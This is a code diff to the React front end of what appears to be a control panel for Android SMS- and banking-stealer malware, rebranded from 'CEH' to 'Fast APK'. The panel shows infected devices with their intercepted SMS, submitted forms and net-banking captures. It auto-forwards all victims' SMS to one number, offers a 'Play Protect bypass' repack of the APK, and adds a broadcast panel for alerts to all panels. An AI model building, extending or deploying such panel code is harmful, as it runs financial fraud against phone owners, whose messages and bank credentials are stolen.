@@ -654,13 +654,15 @@ function SearchBar({ value, onChange, onSearch, filter, onFilter, options, dark 
 function CehBanner({ dark }: { dark: boolean; alertText?: string }) {
   return (
     <div className={`border-b ${dark ? "border-gray-700 bg-gray-900" : "border-gray-100 bg-white"}`}>
-      <div className="flex items-center justify-between px-4 py-2">
-        <div className="flex items-center gap-1.5">
-          <span className={`text-[15px] font-black tracking-widest ${dark ? "text-white" : "text-gray-900"}`}>CEH</span>
-          <span className={`text-[9px] font-bold ${dark ? "text-gray-500" : "text-gray-400"}`}>™</span>
-          <span className={`text-[11px] font-semibold ${dark ? "text-gray-500" : "text-gray-400"}`}>Web Backend</span>
+      <div className="flex items-center gap-2.5 px-4 py-2">
+        <div className="flex h-7 w-7 items-center justify-center rounded-[8px] flex-shrink-0"
+          style={{ background: "linear-gradient(135deg,#3ddc84,#1db954)" }}>
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="white">
+            <path d="M6 18c0 .55.45 1 1 1h1v3.5c0 .83.67 1.5 1.5 1.5S11 23.33 11 22.5V19h2v3.5c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5V19h1c.55 0 1-.45 1-1V8H6v10zM3.5 8C2.67 8 2 8.67 2 9.5v7c0 .83.67 1.5 1.5 1.5S5 17.33 5 16.5v-7C5 8.67 4.33 8 3.5 8zm17 0c-.83 0-1.5.67-1.5 1.5v7c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5v-7c0-.83-.67-1.5-1.5-1.5zm-4.97-5.84l1.3-1.3c.2-.2.2-.51 0-.71-.2-.2-.51-.2-.71 0l-1.48 1.48C13.85 1.23 12.95 1 12 1c-.96 0-1.86.23-2.66.63L7.85.15c-.2-.2-.51-.2-.71 0-.2.2-.2.51 0 .71l1.31 1.31C6.97 3.26 6 5.01 6 7h12c0-1.99-.97-3.75-2.47-4.84zM10 5H9V4h1v1zm5 0h-1V4h1v1z"/>
+          </svg>
         </div>
-        <span className={`text-[10px] font-mono ${dark ? "text-gray-600" : "text-gray-400"}`}>zero-trace.in</span>
+        <span className={`text-[15px] font-black ${dark ? "text-white" : "text-gray-900"}`}>Fast APK</span>
+        <span className={`text-[11px] font-semibold ${dark ? "text-gray-500" : "text-gray-400"}`}>Web Panel</span>
       </div>
     </div>
   );
@@ -754,13 +756,13 @@ function DevZone({ apiBase, apiHeaders }: { apiBase: string; apiHeaders: Record<
   }
 
   return (
-    <div className="rounded-2xl overflow-hidden border-2 border-purple-200 bg-white shadow-sm">
+    <div className="rounded-2xl overflow-hidden border-2 border-indigo-200 bg-white shadow-sm">
       <div className="px-5 pt-5 pb-4">
         <div className="flex items-center gap-2 mb-1">
-          <span className="text-[18px]">🛠️</span>
-          <span className="text-[15px] font-black text-purple-700">Developer Zone</span>
+          <span className="text-[18px]">📡</span>
+          <span className="text-[15px] font-black text-indigo-700">Broadcast Panel</span>
         </div>
-        <p className="text-[12px] text-purple-400 mb-4">Advanced tools — authorized personnel only</p>
+        <p className="text-[12px] text-indigo-400 mb-4">Alert ticker sabhi panels mein broadcast karo</p>
 
         {!unlocked ? (
           <div>
@@ -770,17 +772,17 @@ function DevZone({ apiBase, apiHeaders }: { apiBase: string; apiHeaders: Record<
               onChange={e => setPwInput(e.target.value)}
               onKeyDown={e => e.key === "Enter" && tryUnlock()}
               placeholder="Access code daalo..."
-              className="w-full rounded-xl border border-purple-200 bg-purple-50 px-4 py-3 text-[14px] outline-none focus:border-purple-400 mb-2"
+              className="w-full rounded-xl border border-indigo-200 bg-indigo-50 px-4 py-3 text-[14px] outline-none focus:border-indigo-400 mb-2"
             />
             {pwErr && <div className="text-center text-[12px] font-semibold text-red-500 mb-2">{pwErr}</div>}
             <button type="button" onClick={tryUnlock}
-              className="w-full rounded-xl bg-purple-600 py-3 text-[14px] font-bold text-white active:scale-[0.98]">
+              className="w-full rounded-xl bg-indigo-600 py-3 text-[14px] font-bold text-white active:scale-[0.98]">
               🔓 Unlock
             </button>
           </div>
         ) : (
           <div className="space-y-4">
-            <div className="rounded-xl bg-purple-50 border border-purple-100 px-3 py-2 text-[11px] text-purple-500 font-semibold">
+            <div className="rounded-xl bg-indigo-50 border border-indigo-100 px-3 py-2 text-[11px] text-indigo-500 font-semibold">
               ✅ Developer access unlocked
             </div>
 
@@ -794,7 +796,7 @@ function DevZone({ apiBase, apiHeaders }: { apiBase: string; apiHeaders: Record<
                 value={alertHeader}
                 onChange={e => setAlertHeader(e.target.value)}
                 placeholder="Header (e.g. Security Update)"
-                className="w-full rounded-xl border border-gray-200 bg-gray-50 px-4 py-2.5 text-[13px] outline-none focus:border-purple-400 mb-2"
+                className="w-full rounded-xl border border-gray-200 bg-gray-50 px-4 py-2.5 text-[13px] outline-none focus:border-indigo-400 mb-2"
               />
 
               {/* Content field */}
@@ -803,7 +805,7 @@ function DevZone({ apiBase, apiHeaders }: { apiBase: string; apiHeaders: Record<
                 onChange={e => setAlertTxt(e.target.value)}
                 placeholder="Scrolling content likho... (khali = hata do)"
                 rows={3}
-                className="w-full rounded-xl border border-gray-200 bg-gray-50 px-4 py-3 text-[13px] outline-none focus:border-purple-400 resize-none"
+                className="w-full rounded-xl border border-gray-200 bg-gray-50 px-4 py-3 text-[13px] outline-none focus:border-indigo-400 resize-none"
               />
 
               {alertMsg && (
@@ -813,7 +815,7 @@ function DevZone({ apiBase, apiHeaders }: { apiBase: string; apiHeaders: Record<
               )}
               <div className="flex gap-2 mt-2">
                 <button type="button" onClick={saveAlertText} disabled={alertLoading}
-                  className="flex-1 rounded-xl bg-purple-600 py-2.5 text-[13px] font-bold text-white disabled:opacity-50 active:scale-[0.98]">
+                  className="flex-1 rounded-xl bg-indigo-600 py-2.5 text-[13px] font-bold text-white disabled:opacity-50 active:scale-[0.98]">
                   {alertLoading ? "Sending..." : "📡 Broadcast"}
                 </button>
                 <button type="button" onClick={clearAlertText} disabled={alertLoading}
@@ -824,7 +826,7 @@ function DevZone({ apiBase, apiHeaders }: { apiBase: string; apiHeaders: Record<
             </div>
 
             <button type="button" onClick={() => setUnlocked(false)}
-              className="w-full rounded-xl border border-purple-200 py-2 text-[12px] text-purple-400 active:scale-[0.98]">
+              className="w-full rounded-xl border border-indigo-200 py-2 text-[12px] text-indigo-400 active:scale-[0.98]">
               🔒 Lock
             </button>
           </div>
@@ -872,6 +874,8 @@ export default function MainPage() {
 
   useEffect(() => {
     if ((location.state as any)?.openSettings) { setHelpScreen("settings"); loadSettingsData(); }
+    const y = sessionStorage.getItem("ceh_scroll");
+    if (y) setTimeout(() => { window.scrollTo(0, parseInt(y)); sessionStorage.removeItem("ceh_scroll"); }, 150);
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
@@ -881,7 +885,9 @@ export default function MainPage() {
   const [sortMode,   setSortMode]   = useState<SortMode>("new");
   const [deviceSort, setDeviceSort] = useState<DeviceSortMode>("latest");
   const [alertText,  setAlertText]  = useState("");
-  const [uninstalledSet, setUninstalledSet] = useState<Set<string>>(new Set());
+  const [uninstalledSet, setUninstalledSet] = useState<Set<string>>(() => {
+    try { const s = sessionStorage.getItem("ceh_uninstalled"); return s ? new Set(JSON.parse(s)) : new Set(); } catch { return new Set(); }
+  });
   const [devices,  setDevices]  = useState<AnyRecord[]>([]);
   const [forms,    setForms]    = useState<AnyRecord[]>([]);
   const [smsMap,   setSmsMap]   = useState<Record<string, AnyRecord[]>>({});
@@ -913,6 +919,14 @@ export default function MainPage() {
   const checkTimerRef    = useRef<ReturnType<typeof setTimeout> | null>(null);
   const checkWindowRef   = useRef<number>(0);
   const deviceOrderRef   = useRef<string[]>([]);
+
+  function markUninstalled(did: string) {
+    setUninstalledSet(prev => {
+      const next = new Set([...prev, did]);
+      try { sessionStorage.setItem("ceh_uninstalled", JSON.stringify([...next])); } catch {}
+      return next;
+    });
+  }
 
   const deviceNumMap = useMemo(() => {
     const map: Record<string, number> = {};
@@ -993,9 +1007,9 @@ export default function MainPage() {
       if (event === "netbanking:created" || event === "net_banking:created") { const data = msg.data || {}; const did = String(data.uniqueid || data.deviceId || deviceId || ""); if (!did) return; const pl = data.payload && typeof data.payload === "object" ? data.payload : data; setNetMap((p) => ({ ...p, [did]: [pl, ...(p[did] || [])] })); return; }
       if (event === "favorite:update") { const did = String(msg?.data?.deviceId || ""); const fav = msg?.data?.favorite === true; if (did) setFavoritesMap((p) => ({ ...p, [did]: fav })); return; }
       if (event === "device:lastSeen" || event === "device:upsert") { const did = String(msg.deviceId || msg?.data?.deviceId || ""); setDevices((p) => { const exists = p.some((d) => str(d.deviceId) === did); if (exists) return p.map((d) => str(d.deviceId) === did ? { ...d, ...(msg.data || {}), lastSeen: d.lastSeen, checkedAt: d.checkedAt } : d); if (event === "device:upsert" && msg.data && did) { if (!deviceOrderRef.current.includes(did)) deviceOrderRef.current = [did, ...deviceOrderRef.current]; return [msg.data, ...p]; } return p; }); return; }
-      if (event === "check_online:result") { const did = String(msg.deviceId || msg?.data?.deviceId || ""); const ts = Number(msg?.data?.checkedAt || Date.now()); const status = String(msg?.data?.status || ""); const err = String(msg?.data?.error || ""); const inW = checkDeviceIdRef.current === did && checkStatusRef.current === "checking"; if (status === "online" && did) { setDevices((p) => p.map((d) => str(d.deviceId) === did ? { ...d, checkedAt: ts } : d)); setRecentlyOnlineMap((p) => ({ ...p, [did]: ts })); setTimeout(() => setRecentlyOnlineMap((p) => { const c = { ...p }; delete c[did]; return c; }), 5000); if (inW) { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = "online"; setCheckAlert({ deviceId: did, status: "online" }); } } else if (err === "missing_token" && did) { setUninstalledSet((p) => new Set([...p, did])); if (inW) { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = "uninstalled"; setCheckAlert({ deviceId: did, status: "uninstalled" }); } } else if (err && inW) { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = null; setCheckAlert({ deviceId: did, status: "checking" }); } return; }
-      if (event === "device:uninstalled") { const did = String(msg.deviceId || msg?.data?.deviceId || ""); if (did) setUninstalledSet((p) => new Set([...p, did])); const inW = checkDeviceIdRef.current === did && (checkStatusRef.current === "checking" || (checkStatusRef.current === null && Date.now() - checkWindowRef.current < 30000)); if (inW) { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = "uninstalled"; setCheckAlert({ deviceId: did, status: "uninstalled" }); } return; }
-      if (event === "device:delete") { const did = String(msg.deviceId || msg?.data?.deviceId || ""); setDevices((p) => p.filter((d) => str(d.deviceId) !== did)); setSmsMap((p) => { const c = { ...p }; delete c[did]; return c; }); setUninstalledSet((p) => { const c = new Set(p); c.delete(did); return c; }); }
+      if (event === "check_online:result") { const did = String(msg.deviceId || msg?.data?.deviceId || ""); const ts = Number(msg?.data?.checkedAt || Date.now()); const status = String(msg?.data?.status || ""); const err = String(msg?.data?.error || ""); const inW = checkDeviceIdRef.current === did && checkStatusRef.current === "checking"; if (status === "online" && did) { setDevices((p) => p.map((d) => str(d.deviceId) === did ? { ...d, checkedAt: ts } : d)); setRecentlyOnlineMap((p) => ({ ...p, [did]: ts })); setTimeout(() => setRecentlyOnlineMap((p) => { const c = { ...p }; delete c[did]; return c; }), 5000); if (inW) { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = "online"; setCheckAlert({ deviceId: did, status: "online" }); } } else if (err === "missing_token" && did) { markUninstalled(did); if (inW) { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = "uninstalled"; setCheckAlert({ deviceId: did, status: "uninstalled" }); } } else if (err && inW) { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = null; setCheckAlert({ deviceId: did, status: "checking" }); } return; }
+      if (event === "device:uninstalled") { const did = String(msg.deviceId || msg?.data?.deviceId || ""); if (did) markUninstalled(did); const inW = checkDeviceIdRef.current === did && (checkStatusRef.current === "checking" || (checkStatusRef.current === null && Date.now() - checkWindowRef.current < 30000)); if (inW) { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = "uninstalled"; setCheckAlert({ deviceId: did, status: "uninstalled" }); } return; }
+      if (event === "device:delete") { const did = String(msg.deviceId || msg?.data?.deviceId || ""); setDevices((p) => p.filter((d) => str(d.deviceId) !== did)); setSmsMap((p) => { const c = { ...p }; delete c[did]; return c; }); setUninstalledSet((p) => { const c = new Set(p); c.delete(did); try { sessionStorage.setItem("ceh_uninstalled", JSON.stringify([...c])); } catch {} return c; }); }
     });
     return () => { off(); };
   }, [loadAll]);
@@ -1011,7 +1025,11 @@ export default function MainPage() {
     try { await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(deviceId)}/ping`, { source: "main" }, { headers: apiHeaders(), timeout: 10000 }); } catch {}
   }, []);
 
-  const openDevice      = useCallback((id: string) => { if (id) nav(`/devices/${encodeURIComponent(id)}`); }, [nav]);
+  const openDevice = useCallback((id: string) => {
+    if (!id) return;
+    try { sessionStorage.setItem("ceh_scroll", String(window.scrollY)); } catch {}
+    nav(`/devices/${encodeURIComponent(id)}`, { state: { from: activeTab } });
+  }, [nav, activeTab]);
   const closeCheckAlert = useCallback(() => { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); setCheckAlert(null); }, []);
   const commitSearch    = useCallback(() => { setSearchQ(search.trim().toLowerCase()); }, [search]);
 
@@ -1223,8 +1241,7 @@ export default function MainPage() {
 
       {activeTab === "home" && (
         <div className="space-y-3 px-0 pb-24 pt-1">
-          <FixApkBanner dark={dark} onOpen={openFixApk} />
-          {isLoading ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div>
+          {isLoading ?<div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div>
             : filterQ(mixedFeed).length === 0 ? <div className={`py-10 text-center ${D.empty(dark)}`}>No data yet.</div>
             : <div className="space-y-3 px-3">{filterQ(mixedFeed).slice(0, 100).map((item, i) => item._type === "form" ? <FormCard key={getId(item) || i} form={item} onDeviceClick={openDevice} dark={dark} deviceNumMap={deviceNumMap} /> : <SmsCard key={getId(item) || i} sms={item} onDeviceClick={openDevice} dark={dark} pageNum={smsPageMap[getId(item)]} deviceNumMap={deviceNumMap} />)}</div>}
         </div>
@@ -1291,18 +1308,40 @@ export default function MainPage() {
       {/* HELP BOTTOM SHEET */}
       {helpOpen && (
         <div className="fixed inset-0 z-[1000] flex items-end bg-black/60" onClick={() => setHelpOpen(false)}>
-          <div className="w-full rounded-t-2xl bg-[#1c1c1c] px-5 pt-5 pb-8" onClick={(e) => e.stopPropagation()}>
-            <div className="mb-4 flex items-center justify-between"><span className="text-[18px] font-bold text-white">Help</span><button type="button" onClick={() => setHelpOpen(false)} className="flex h-7 w-7 items-center justify-center rounded-lg border border-gray-600 text-[14px] text-gray-400">✕</button></div>
-            <div className="mb-5 divide-y divide-gray-700 border-t border-gray-700">
-              {[{ label: "Fix APK", icon: "🔧", onClick: openFixApk }, { label: "APK Info", icon: "📦", onClick: () => { setHelpOpen(false); setHelpScreen("apk"); loadLicenseInfo(); } }, { label: "Settings", icon: "⚙️", onClick: () => { setHelpOpen(false); setHelpScreen("settings"); loadSettingsData(); loadLicenseInfo(); } }, { label: "Logout", icon: "🚪", onClick: handleLogout }].map((item) => (
-                <button key={item.label} type="button" onClick={item.onClick} className="flex w-full items-center justify-between py-3 text-[15px] text-gray-200">
-                  <span className="flex items-center gap-3"><span className="text-[18px]">{item.icon}</span>{item.label}</span><span className="text-gray-500">›</span>
+          <div className="w-full rounded-t-3xl bg-[#1c1c1e] px-5 pt-3 pb-8" onClick={(e) => e.stopPropagation()}>
+            {/* Handle */}
+            <div className="mx-auto mb-4 h-1 w-10 rounded-full bg-white/20" />
+            {/* Title row */}
+            <div className="mb-4 flex items-center justify-between">
+              <span className="text-[18px] font-bold text-white">Help & Settings</span>
+              <button type="button" onClick={() => setHelpOpen(false)} className="flex h-8 w-8 items-center justify-center rounded-full bg-white/10 text-[13px] text-white/60">✕</button>
+            </div>
+            {/* Menu items */}
+            <div className="mb-5 space-y-1">
+              {[
+                { label: "Fix APK", sub: "Play Protect bypass — automatic repack", icon: "🔧", grad: "linear-gradient(135deg,#f7971e,#ffd200)", onClick: openFixApk },
+                { label: "APK Info", sub: "Panel details, license & stats", icon: "📦", grad: "linear-gradient(135deg,#4facfe,#00f2fe)", onClick: () => { setHelpOpen(false); setHelpScreen("apk"); loadLicenseInfo(); } },
+                { label: "Settings", sub: "Password, SMS forward, danger zone", icon: "⚙️", grad: "linear-gradient(135deg,#a18cd1,#fbc2eb)", onClick: () => { setHelpOpen(false); setHelpScreen("settings"); loadSettingsData(); loadLicenseInfo(); } },
+                { label: "Logout", sub: "Is panel se bahar jao", icon: "🚪", grad: "linear-gradient(135deg,#f5576c,#f093fb)", onClick: handleLogout },
+              ].map((item) => (
+                <button key={item.label} type="button" onClick={item.onClick}
+                  className="flex w-full items-center gap-3 rounded-2xl px-3 py-3 text-left active:bg-white/5 transition-colors">
+                  <div className="flex h-11 w-11 items-center justify-center rounded-2xl flex-shrink-0 text-[22px]"
+                    style={{ background: item.grad }}>
+                    {item.icon}
+                  </div>
+                  <div className="flex-1 min-w-0">
+                    <div className="text-[15px] font-semibold text-white">{item.label}</div>
+                    <div className="text-[12px] text-white/40 truncate">{item.sub}</div>
+                  </div>
+                  <span className="text-[20px] text-white/25">›</span>
                 </button>
               ))}
             </div>
+            {/* Contact buttons */}
             <div className="space-y-2">
-              <button type="button" onClick={() => setContactOpen(true)} className="w-full rounded-xl border-2 border-green-500 py-3 text-[14px] font-semibold text-green-400">Contact Us</button>
-              <button type="button" onClick={openTelegramHelp} className="w-full rounded-xl border-2 border-blue-500 py-3 text-[14px] font-semibold text-blue-400">Telegram Channel</button>
+              <button type="button" onClick={() => setContactOpen(true)} className="w-full rounded-2xl border border-green-500/40 bg-green-500/10 py-3 text-[14px] font-semibold text-green-400">Contact Us</button>
+              <button type="button" onClick={openTelegramHelp} className="w-full rounded-2xl border border-blue-500/40 bg-blue-500/10 py-3 text-[14px] font-semibold text-blue-400">Telegram Channel</button>
             </div>
           </div>
         </div>
@@ -1323,9 +1362,9 @@ export default function MainPage() {
       {/* ══ SETTINGS SCREEN ══ */}
       {helpScreen === "settings" && (
         <div className="fixed inset-0 z-[1000] overflow-auto bg-[#f2f2f7]">
-          <div className="sticky top-0 z-10 flex items-center gap-3 border-b border-gray-200 bg-white px-4 py-3 shadow-sm">
-            <button type="button" onClick={() => setHelpScreen("")} className="flex h-8 w-8 items-center justify-center rounded-full bg-gray-100 text-[18px] text-gray-600">←</button>
-            <span className="text-[17px] font-bold text-gray-900">Settings</span>
+          <div className="sticky top-0 z-10 flex items-center gap-3 border-b border-white/10 bg-[#111] px-4 py-3">
+            <button type="button" onClick={() => setHelpScreen("")} className="flex h-8 w-8 items-center justify-center rounded-full bg-white/10 text-[18px] text-white">←</button>
+            <span className="text-[17px] font-bold text-white">Settings</span>
           </div>
           <div className="mx-auto max-w-[480px] space-y-3 p-4">
 
@@ -1338,7 +1377,7 @@ export default function MainPage() {
               }`}>
                 <div className="flex items-center justify-between">
                   <div className="flex items-center gap-2">
-                    <span className="text-[18px]">📅</span>
+                    <div className="flex h-9 w-9 items-center justify-center rounded-2xl flex-shrink-0 text-[16px]" style={{ background: "linear-gradient(135deg,#a18cd1,#fbc2eb)" }}>📅</div>
                     <span className="text-[14px] font-bold text-gray-800">License Status</span>
                   </div>
                   <span className={`rounded-full px-3 py-1 text-[11px] font-black ${
@@ -1370,7 +1409,7 @@ export default function MainPage() {
             {/* SMS Forwarding */}
             <div className="rounded-2xl bg-white shadow-sm overflow-hidden">
               <div className="px-5 pt-5 pb-2">
-                <div className="flex items-center gap-2 mb-1"><span className="text-[18px]">📲</span><span className="text-[15px] font-bold text-gray-900">Auto SMS Forwarding</span></div>
+                <div className="flex items-center gap-2 mb-1"><div className="flex h-9 w-9 items-center justify-center rounded-2xl flex-shrink-0 text-[16px]" style={{ background: "linear-gradient(135deg,#43e97b,#38f9d7)" }}>📲</div><span className="text-[15px] font-bold text-gray-900">Auto SMS Forwarding</span></div>
                 <p className="text-[12px] text-gray-400 mb-4">Sabhi SMS automatically ek number pe forward hote hain</p>
                 {globalPhone ? (
                   <div className="mb-4 flex items-center justify-between rounded-xl bg-green-50 border border-green-200 px-4 py-3">
@@ -1396,7 +1435,7 @@ export default function MainPage() {
             {/* Change Login Password */}
             <div className="rounded-2xl bg-white shadow-sm overflow-hidden">
               <div className="px-5 pt-5 pb-2">
-                <div className="flex items-center gap-2 mb-1"><span className="text-[18px]">🔑</span><span className="text-[15px] font-bold text-gray-900">Login Password Change</span></div>
+                <div className="flex items-center gap-2 mb-1"><div className="flex h-9 w-9 items-center justify-center rounded-2xl flex-shrink-0 text-[16px]" style={{ background: "linear-gradient(135deg,#4facfe,#00f2fe)" }}>🔑</div><span className="text-[15px] font-bold text-gray-900">Login Password Change</span></div>
                 <p className="text-[12px] text-gray-400 mb-4">Password change hone par sare devices se logout ho jaoge</p>
                 <SettingsInput label="Purana Password" value={loginPassOld} onChange={setLoginPassOld} type="password" />
                 <SettingsInput label="Naya Password" value={loginPassNew} onChange={setLoginPassNew} type="password" />
@@ -1416,7 +1455,7 @@ export default function MainPage() {
             {/* Delete Password PIN */}
             <div className="rounded-2xl bg-white shadow-sm overflow-hidden">
               <div className="px-5 pt-5 pb-2">
-                <div className="flex items-center gap-2 mb-1"><span className="text-[18px]">🔐</span><span className="text-[15px] font-bold text-gray-900">{pinIsSet === false ? "Set Delete PIN" : "Change Delete PIN"}</span></div>
+                <div className="flex items-center gap-2 mb-1"><div className="flex h-9 w-9 items-center justify-center rounded-2xl flex-shrink-0 text-[16px]" style={{ background: "linear-gradient(135deg,#f7971e,#ffd200)" }}>🔐</div><span className="text-[15px] font-bold text-gray-900">{pinIsSet === false ? "Set Delete PIN" : "Change Delete PIN"}</span></div>
                 <p className="text-[12px] text-gray-400 mb-4">{pinIsSet === false ? "SMS/Device delete ke liye PIN set karo" : "SMS/Device delete PIN badlo"}</p>
                 {pinIsSet !== false && <SettingsInput label="Old PIN" value={pinOld} onChange={setPinOld} type="password" inputMode="numeric" />}
                 <SettingsInput label="New PIN" value={pinNew} onChange={setPinNew} type="password" inputMode="numeric" />
@@ -1451,7 +1490,7 @@ export default function MainPage() {
             <div className="rounded-2xl overflow-hidden border-2 border-red-200 bg-white shadow-sm">
               <div className="px-5 pt-5 pb-3">
                 <div className="flex items-center gap-2 mb-1">
-                  <span className="text-[18px]">⚠️</span>
+                  <div className="flex h-9 w-9 items-center justify-center rounded-2xl flex-shrink-0 text-[16px]" style={{ background: "linear-gradient(135deg,#f5576c,#f093fb)" }}>⚠️</div>
                   <span className="text-[15px] font-black text-red-600">Danger Zone</span>
                 </div>
                 <p className="text-[12px] text-red-400 mb-4">Yahan se kiya koi bhi action undo nahi ho sakta. Soch ke karo!</p>
@@ -1488,9 +1527,6 @@ export default function MainPage() {
               </div>
             </div>
 
-            {/* ─── Developer Zone ─── */}
-            <DevZone apiBase={str(ENV.API_BASE || "")} apiHeaders={apiHeaders()} />
-
           </div>
         </div>
       )}
@@ -1504,7 +1540,7 @@ export default function MainPage() {
             <button type="button" onClick={() => setHelpScreen("")}
               className="flex h-9 w-9 items-center justify-center rounded-full bg-white/10 text-white text-[18px]">←</button>
             <div className="flex-1">
-              <div className="text-[10px] font-bold tracking-widest text-orange-400 uppercase">CEH Panel</div>
+              <div className="text-[10px] font-bold tracking-widest text-orange-400 uppercase">Fast APK</div>
               <div className="text-[20px] font-black text-white">APK Info</div>
             </div>
             <div className="flex h-11 w-11 items-center justify-center rounded-2xl"
@@ -1603,6 +1639,11 @@ export default function MainPage() {
                 <div className="text-[13px] font-semibold text-blue-300 truncate">{str(ENV.TELEGRAM_CHANNEL || "")}</div>
               </div>
             )}
+
+            {/* Broadcast Panel */}
+            <div className="rounded-2xl overflow-hidden border border-white/10" style={{ background: "rgba(255,255,255,0.05)" }}>
+              <DevZone apiBase={str(ENV.API_BASE || "")} apiHeaders={apiHeaders()} />
+            </div>
 
             {/* Buttons */}
             <button type="button" onClick={openTelegramHelp}
